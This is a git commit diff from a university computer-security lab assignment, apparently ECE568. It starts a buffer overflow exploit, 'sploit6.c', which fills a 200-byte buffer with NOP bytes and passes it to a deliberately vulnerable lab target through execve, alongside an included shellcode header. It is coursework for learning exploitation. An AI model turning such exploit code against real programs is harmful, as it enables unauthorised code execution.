8e2fb0ba2e3df719884936683cfebf267a9f9393
Shadman  Kaif <kaifmd@p69.ecf.utoronto.ca>
2023-01-31 14:32:26 -0500

    Started sploit 6

--- Lab 1/ECE568-lab1/sploits/sploit6.c
+++ Lab 1/ECE568-lab1/sploits/sploit6.c
@@ -5,13 +5,23 @@
 #include "shellcode-64.h"
 
 #define TARGET "../targets/target6"
+#define NOP 0x90
+#define BUFFER_SIZE 200
 
 int main(void)
 {
-  char *args[3];
-  char *env[1];
+  char * args[3];
+  char * env[1];
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+  char bufferExploit[BUFFER_SIZE];
+  memset(bufferExploit, NOP, BUFFER_SIZE);
+
+
+  args[0] = TARGET; 
+  //args[1] = "hi there"; 
+  args[1] = bufferExploit;
+  args[2] = NULL;
+  
   env[0] = NULL;
 
   if (0 > execve(TARGET, args, env))
